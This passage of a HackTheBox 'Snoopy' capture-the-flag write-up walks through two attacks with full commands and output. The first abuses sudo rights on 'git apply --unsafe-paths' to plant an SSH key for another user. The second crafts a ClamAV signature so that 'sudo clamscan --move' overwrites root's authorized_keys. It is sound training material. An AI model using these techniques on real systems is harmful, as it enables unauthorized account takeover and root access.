+</h2><h3 id="leveraging-git-apply-to-patch-files-outside-of-git-repository">Leveraging git apply to patch files outside of git repository
+</h3><p>Checking sudo privs:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cbrown@snoopy:~$ sudo -l
+</span></span><span class="line"><span class="cl"><span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> cbrown:
+</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> cbrown on snoopy:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin, use_pty
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User cbrown may run the following commands on snoopy:
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>sbrown<span class="o">)</span> PASSWD: /usr/bin/git apply *
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>With <code>git apply</code>, we can use a patch file containing git differences, and apply the changes specified. With the <code>--unsafe-paths</code> flag, we are able to make changes to files outside the regular git directory. We can use this for lateral movement by creating a git diff file in which we add our ssh public key to authorized_keys, and point the edit path to be in /home/sbrown/.ssh/ folder. This will allow us to authenticate as <code>sbrown</code> using our own ssh key. Generating the ssh key in kali:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/Snoopy<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ ssh-keygen -t rsa -b <span class="m">4096</span>
+</span></span><span class="line"><span class="cl">Generating public/private rsa key pair.
+</span></span><span class="line"><span class="cl">Enter file in which to save the key <span class="o">(</span>/home/kali/.ssh/id_rsa<span class="o">)</span>:
+</span></span><span class="line"><span class="cl">Enter passphrase <span class="o">(</span>empty <span class="k">for</span> no passphrase<span class="o">)</span>:
+</span></span><span class="line"><span class="cl">Enter same passphrase again:
+</span></span><span class="line"><span class="cl">Your identification has been saved in /home/kali/.ssh/id_rsa
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now, getting our id_rsa.pub, we will add this to the target&rsquo;s authorized_keys file:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/Snoopy<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ cat ~/.ssh/id_rsa.pub
+</span></span><span class="line"><span class="cl">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCoYOhyzFyp/SK3eAv9dlpn7iXK16ZyDfwaFWvxP09jI3NfPmP/6aS8aTQxx09IOsfFwVhdu+cI2SXqn3QboOcQQXJOujgSeBkuFqtocxUla12XG3nYX0SSK0QQZdcQCIj+ufSRQ1Iw5DKUTeZLfjuC1CTiIqJ3fm38RbzP0sA2hsrZj7bDq8HF9sdE9AzE2w9pG5SOEICary8Y0SBJg2LB2kd6EsAiMPTHNCsk4H+dIKphkmsxxUvYPQ9PJbxCr8TLWmCrEWxVVQqeU5z2jRZUlPw0/K1F1zSBYHCYCXs6hMO/Gh/WMqKPQc16IN0L/kRQoz0yVWxQMUxOTor1X9Gh1e0TBfk08VUQ7l1QG4iCxmLwkIFeOubSZby5tnRAvfeh1fKge3hahBmMcnX06S+OhzSM9N8AESDhm4I5+n6IJVEkGnXFdfMeZuxoF14xNubPFQ/pVmw62BUui6WiS8fAPDeuaKNIRkfx2ziOOV7mSnHcKsgPoU0u/2JPOilYLl3knq15Xl13FzH/PBWRMI7ejfPmaOS96Q55SRUntuG5NWY1LWkeGnX2kag8zZ1gRdcfKMIKJ0yGnI5b0fqr4p+WsbBAXAnuqFSds65jwIFxTp3l35cjyBlyaqncQZId6ZSt0xdEM85dnsDapU2f3Ol6jEEEzYcNOZwINyM+QFLvbQ<span class="o">==</span> kali@kali
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>First making a git repository with an initial commit:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cbrown@snoopy:/dev/shm$ mkdir gittest
+</span></span><span class="line"><span class="cl">cbrown@snoopy:/dev/shm$ <span class="nb">cd</span> gittest/
+</span></span><span class="line"><span class="cl">cbrown@snoopy:/dev/shm/gittest$ git init
+</span></span><span class="line"><span class="cl">Initialized empty Git repository in /dev/shm/gittest/.git/
+</span></span><span class="line"><span class="cl">cbrown@snoopy:/dev/shm/gittest$ touch <span class="nb">test</span>
+</span></span><span class="line"><span class="cl">cbrown@snoopy:/dev/shm/gittest$ git add .
+</span></span><span class="line"><span class="cl">cbrown@snoopy:/dev/shm/gittest$ git commit -m <span class="s1">&#39;init&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>main <span class="o">(</span>root-commit<span class="o">)</span> 6e665e0<span class="o">]</span> init
+</span></span><span class="line"><span class="cl"> <span class="m">1</span> file changed, <span class="m">0</span> insertions<span class="o">(</span>+<span class="o">)</span>, <span class="m">0</span> deletions<span class="o">(</span>-<span class="o">)</span>
+</span></span><span class="line"><span class="cl"> create mode <span class="m">100644</span> <span class="nb">test</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>After 1 commit, we have a reference. We add the authorized_keys file and make a 2nd commit.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cbrown@snoopy:/dev/shm/gittest$ vim authorized_keys
+</span></span><span class="line"><span class="cl">cbrown@snoopy:/dev/shm/gittest$ git add .
+</span></span><span class="line"><span class="cl">cbrown@snoopy:/dev/shm/gittest$ git commit -m <span class="s1">&#39;test&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>main 6d81c28<span class="o">]</span> <span class="nb">test</span>
+</span></span><span class="line"><span class="cl"> <span class="m">1</span> file changed, <span class="m">1</span> insertion<span class="o">(</span>+<span class="o">)</span>
+</span></span><span class="line"><span class="cl"> create mode <span class="m">100644</span> authorized_keys
+</span></span><span class="line"><span class="cl">cbrown@snoopy:/dev/shm/gittest$ git log
+</span></span><span class="line"><span class="cl">commit 6d81c284773a4d699ac388166473090e3375beb8 <span class="o">(</span>HEAD -&gt; main<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Author: cbrown &lt;cbrown@snoopy.htb&gt;
+</span></span><span class="line"><span class="cl">Date:   Tue May <span class="m">09</span> 15:33:35 <span class="m">2023</span> +0000
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nb">test</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">commit 6e665e02a51919d212d5d9fdf6ac01a513cc23e6
+</span></span><span class="line"><span class="cl">Author: cbrown &lt;cbrown@snoopy.htb&gt;
+</span></span><span class="line"><span class="cl">Date:   Tue May <span class="m">09</span> 15:31:22 <span class="m">2023</span> +0000
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    init
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now we can use <code>git diff</code> to create a diff file:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cbrown@snoopy:/dev/shm/gittest$ git diff 6e665e02a51919d212d5d9fdf6ac01a513cc23e6
+</span></span><span class="line"><span class="cl">diff --git a/authorized_keys b/authorized_keys
+</span></span><span class="line"><span class="cl">new file mode <span class="m">100644</span>
+</span></span><span class="line"><span class="cl">index 0000000..90fad14
+</span></span><span class="line"><span class="cl">--- /dev/null
+</span></span><span class="line"><span class="cl">+++ b/authorized_keys
+</span></span><span class="line"><span class="cl">@@ -0,0 +1 @@
+</span></span><span class="line"><span class="cl">+sh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCoYOhyzFyp/SK3eAv9dlpn7iXK16ZyDfwaFWvxP09jI3NfPmP/6aS8aTQxx09IOsfFwVhdu+cI2SXqn3QboOcQQXJOujgSeBkuFqtocxUla12XG3nYX0SSK0QQZdcQCIj+ufSRQ1Iw5DKUTeZLfjuC1CTiIqJ3fm38RbzP0sA2hsrZj7bDq8HF9sdE9AzE2w9pG5SOEICary8Y0SBJg2LB2kd6EsAiMPTHNCsk4H+dIKphkmsxxUvYPQ9PJbxCr8TLWmCrEWxVVQqeU5z2jRZUlPw0/K1F1zSBYHCYCXs6hMO/Gh/WMqKPQc16IN0L/kRQoz0yVWxQMUxOTor1X9Gh1e0TBfk08VUQ7l1QG4iCxmLwkIFeOubSZby5tnRAvfeh1fKge3hahBmMcnX06S+OhzSM9N8AESDhm4I5+n6IJVEkGnXFdfMeZuxoF14xNubPFQ/pVmw62BUui6WiS8fAPDeuaKNIRkfx2ziOOV7mSnHcKsgPoU0u/2JPOilYLl3knq15Xl13FzH/PBWRMI7ejfPmaOS96Q55SRUntuG5NWY1LWkeGnX2kag8zZ1gRdcfKMIKJ0yGnI5b0fqr4p+WsbBAXAnuqFSds65jwIFxTp3l35cjyBlyaqncQZId6ZSt0xdEM85dnsDapU2f3Ol6jEEEzYcNOZwINyM+QFLvbQ<span class="o">==</span> kali@kali
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Executing the git apply:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cbrown@snoopy:/dev/shm/gittest$ sudo -u sbrown git apply --unsafe-paths --directory <span class="s2">&#34;/home/sbrown/.ssh&#34;</span> patch 
+</span></span><span class="line"><span class="cl">Checking patch /home/sbrown/.ssh/authorized_keys...
+</span></span><span class="line"><span class="cl">Applied patch /home/sbrown/.ssh/authorized_keys cleanly.
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now we can authenticate:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/Snoopy<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ ssh sbrown@10.10.11.212
+</span></span><span class="line"><span class="cl">Welcome to Ubuntu 22.04.2 LTS <span class="o">(</span>GNU/Linux 5.15.0-71-generic x86_64<span class="o">)</span>
+</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
+</span></span><span class="line"><span class="cl">sbrown@snoopy:~$
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="privilege-escalation">Privilege Escalation
+</h2><h3 id="abusing-clamav-scanning-to-rewrite-authorized_keys">Abusing ClamAV scanning to rewrite authorized_keys
+</h3><p>Checking for sudo privileges:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sbrown@snoopy:~$ sudo -l
+</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> sbrown on snoopy:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin, use_pty
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User sbrown may run the following commands on snoopy:
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/local/bin/clamscan
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We are able to run <code>clamscan</code>, an antivirus scanner, as root. One of the features of this scanner is we can supply our own virus signature databases, and we are also able to specify how we might treat &ldquo;infected&rdquo; files. My idea was to create an extremely generic virus database, one that will flag whichever file I want even when I can&rsquo;t read it. Next, I scan my own authorized_keys file, and set the scan to move infected files to /root/.ssh/. When this happens, I will be able to authenticate once again with my own key.</p>
+<p>Using <a class="link" href="https://forum.proxmox.com/threads/clamav-create-custom-signature-database-file.113754/"  target="_blank" rel="noopener"
+    >this resource</a> to generate a vague database. First, use <code>xxd</code> to generate the first segment of hex:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sbrown@snoopy:/tmp$ xxd /home/sbrown/.ssh/authorized_keys 
+</span></span><span class="line"><span class="cl">00000000: <span class="m">7373</span> 682d <span class="m">7273</span> <span class="m">6120</span> <span class="m">4141</span> <span class="m">4141</span> <span class="m">4233</span> 4e7a  ssh-rsa AAAAB3Nz
+</span></span><span class="line"><span class="cl">00000010: <span class="m">6143</span> <span class="m">3179</span> <span class="m">6332</span> <span class="m">4541</span> <span class="m">4141</span> <span class="m">4144</span> <span class="m">4151</span> <span class="m">4142</span>  aC1yc2EAAAADAQAB
+</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The virus database is considered malformed if I use a signature fewer than 8 characters. So, using the first 8, I create a database with 1 entry:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sbrown@snoopy:/tmp$ cat 1.ndb 
+</span></span><span class="line"><span class="cl">Trojan.A:0:*:7373682d
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now when we scan any authorized_keys file, it is flagged as a virus:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sbrown@snoopy:/tmp$ clamscan -d 1.ndb /home/sbrown/.ssh/authorized_keys 
+</span></span><span class="line"><span class="cl">Loading:     0s, ETA:   0s <span class="o">[========================</span>&gt;<span class="o">]</span>        1/1 sigs    
+</span></span><span class="line"><span class="cl">Compiling:   0s, ETA:   0s <span class="o">[========================</span>&gt;<span class="o">]</span>       40/40 tasks 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/home/sbrown/.ssh/authorized_keys: Trojan.A.UNOFFICIAL FOUND
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">----------- SCAN SUMMARY -----------
+</span></span><span class="line"><span class="cl">Known viruses: <span class="m">1</span>
+</span></span><span class="line"><span class="cl">Engine version: 1.0.0
+</span></span><span class="line"><span class="cl">Scanned directories: <span class="m">0</span>
+</span></span><span class="line"><span class="cl">Scanned files: <span class="m">1</span>
+</span></span><span class="line"><span class="cl">Infected files: <span class="m">1</span>
+</span></span><span class="line"><span class="cl">Data scanned: 0.00 MB
+</span></span><span class="line"><span class="cl">Data read: 0.00 MB <span class="o">(</span>ratio 0.00:1<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Time: 0.010 sec <span class="o">(</span><span class="m">0</span> m <span class="m">0</span> s<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Start Date: 2023:05:09 22:29:21
+</span></span><span class="line"><span class="cl">End Date:   2023:05:09 22:29:21
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>If we send a copy to /root/.ssh/authorized_keys now, it will be renamed to authorized_keys1 since there already exists keys. We can scan /root/.ssh/authorized_keys now, and move it somewhere else:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sbrown@snoopy:/tmp$ sudo clamscan -d 1.ndb /root/.ssh/authorized_keys --move<span class="o">=</span>./
+</span></span><span class="line"><span class="cl">Loading:     0s, ETA:   0s <span class="o">[========================</span>&gt;<span class="o">]</span>        1/1 sigs
+</span></span><span class="line"><span class="cl">Compiling:   0s, ETA:   0s <span class="o">[========================</span>&gt;<span class="o">]</span>       40/40 tasks
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/root/.ssh/authorized_keys: Trojan.A.UNOFFICIAL FOUND
+</span></span><span class="line"><span class="cl">traverse_rename: Failed to rename: /root/.ssh/authorized_keys
+</span></span><span class="line"><span class="cl">        to: /tmp/authorized_keys
+</span></span><span class="line"><span class="cl">Error:Invalid cross-device link
+</span></span><span class="line"><span class="cl">/root/.ssh/authorized_keys: moved to <span class="s1">&#39;/tmp/authorized_keys&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">----------- SCAN SUMMARY -----------
+</span></span><span class="line"><span class="cl">Known viruses: <span class="m">1</span>
+</span></span><span class="line"><span class="cl">Engine version: 1.0.0
+</span></span><span class="line"><span class="cl">Scanned directories: <span class="m">0</span>
+</span></span><span class="line"><span class="cl">Scanned files: <span class="m">1</span>
+</span></span><span class="line"><span class="cl">Infected files: <span class="m">1</span>
+</span></span><span class="line"><span class="cl">Data scanned: 0.00 MB
+</span></span><span class="line"><span class="cl">Data read: 0.00 MB <span class="o">(</span>ratio 0.00:1<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Time: 0.010 sec <span class="o">(</span><span class="m">0</span> m <span class="m">0</span> s<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Start Date: 2023:05:09 22:32:34
+</span></span><span class="line"><span class="cl">End Date:   2023:05:09 22:32:34
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now I edited this authorized_keys to recognize my kali private key:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sbrown@snoopy:/tmp$ cat authorized_keys
+</span></span><span class="line"><span class="cl">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCoYOhyzFyp/SK3eAv9dlpn7iXK16ZyDfwaFWvxP09jI3NfPmP/6aS8aTQxx09IOsfFwVhdu+cI2SXqn3QboOcQQXJOujgSeBkuFqtocxUla12XG3nYX0SSK0QQZdcQCIj+ufSRQ1Iw5DKUTeZLfjuC1CTiIqJ3fm38RbzP0sA2hsrZj7bDq8HF9sdE9AzE2w9pG5SOEICary8Y0SBJg2LB2kd6EsAiMPTHNCsk4H+dIKphkmsxxUvYPQ9PJbxCr8TLWmCrEWxVVQqeU5z2jRZUlPw0/K1F1zSBYHCYCXs6hMO/Gh/WMqKPQc16IN0L/kRQoz0yVWxQMUxOTor1X9Gh1e0TBfk08VUQ7l1QG4iCxmLwkIFeOubSZby5tnRAvfeh1fKge3hahBmMcnX06S+OhzSM9N8AESDhm4I5+n6IJVEkGnXFdfMeZuxoF14xNubPFQ/pVmw62BUui6WiS8fAPDeuaKNIRkfx2ziOOV7mSnHcKsgPoU0u/2JPOilYLl3knq15Xl13FzH/PBWRMI7ejfPmaOS96Q55SRUntuG5NWY1LWkeGnX2kag8zZ1gRdcfKMIKJ0yGnI5b0fqr4p+WsbBAXAnuqFSds65jwIFxTp3l35cjyBlyaqncQZId6ZSt0xdEM85dnsDapU2f3Ol6jEEEzYcNOZwINyM+QFLvbQ<span class="o">==</span> kali@kali
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Lastly, I sent it back:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sbrown@snoopy:/tmp$ sudo clamscan -d 1.ndb ./authorized_keys --move<span class="o">=</span>/root/.ssh/
+</span></span><span class="line"><span class="cl">Loading:     0s, ETA:   0s <span class="o">[========================</span>&gt;<span class="o">]</span>        1/1 sigs
+</span></span><span class="line"><span class="cl">Compiling:   0s, ETA:   0s <span class="o">[========================</span>&gt;<span class="o">]</span>       40/40 tasks
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/tmp/authorized_keys: Trojan.A.UNOFFICIAL FOUND
+</span></span><span class="line"><span class="cl">traverse_rename: Failed to rename: /tmp/authorized_keys
+</span></span><span class="line"><span class="cl">        to: /root/.ssh/authorized_keys
+</span></span><span class="line"><span class="cl">Error:Invalid cross-device link
+</span></span><span class="line"><span class="cl">/tmp/authorized_keys: moved to <span class="s1">&#39;/root/.ssh/authorized_keys&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">----------- SCAN SUMMARY -----------
+</span></span><span class="line"><span class="cl">Known viruses: <span class="m">1</span>
+</span></span><span class="line"><span class="cl">Engine version: 1.0.0
+</span></span><span class="line"><span class="cl">Scanned directories: <span class="m">0</span>
+</span></span><span class="line"><span class="cl">Scanned files: <span class="m">1</span>
+</span></span><span class="line"><span class="cl">Infected files: <span class="m">1</span>
+</span></span><span class="line"><span class="cl">Data scanned: 0.00 MB
+</span></span><span class="line"><span class="cl">Data read: 0.00 MB <span class="o">(</span>ratio 0.00:1<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Time: 0.012 sec <span class="o">(</span><span class="m">0</span> m <span class="m">0</span> s<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Start Date: 2023:05:09 22:35:07
+</span></span><span class="line"><span class="cl">End Date:   2023:05:09 22:35:07
+</span></span><span class="line"><span class="cl">sbrown@snoopy:/tmp$
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now I can authenticate as root:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/Snoopy<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ ssh root@10.10.11.212
+</span></span><span class="line"><span class="cl">Welcome to Ubuntu 22.04.2 LTS <span class="o">(</span>GNU/Linux 5.15.0-71-generic x86_64<span class="o">)</span>
+</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
+</span></span><span class="line"><span class="cl">root@snoopy:~# whoami
+</span></span><span class="line"><span class="cl">root
+</span></span><span class="line"><span class="cl">root@snoopy:~# 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="reflection">Reflection
+</h2><p>I enjoyed the learning process for this box a considerable amount. Even from the beginning of enumerating DNS config files and setting up a mail server, this challenge gave me the opportunity to learn many new things! Although it was revealed to be mostly unintended, I appreciated how there were several possible paths to root. It was fun to discuss with others the ideas they had to manipulate the <code>clamscan</code> behaviors.</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/arbitrary-file-read/">Arbitrary File Read</a>
+        
+            <a href="/tags/dns/">DNS</a>
+        
+            <a href="/tags/postfix/">Postfix</a>
+        
+            <a href="/tags/zone-transfer/">Zone Transfer</a>
+        
+            <a href="/tags/nsupdate/">Nsupdate</a>
+        
+            <a href="/tags/mattermost/">MatterMost</a>
+        
+            <a href="/tags/ssh-honeypot/">SSH Honeypot</a>
+        
+            <a href="/tags/cowrie/">Cowrie</a>
+        
+            <a href="/tags/git/">Git</a>
+        
+            <a href="/tags/clamav/">ClamAV</a>
+        
+            <a href="/tags/clamscan/">Clamscan</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">Related content</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/hackthebox-pilgrimage/">
+        
+        
+            <div class="article-image">
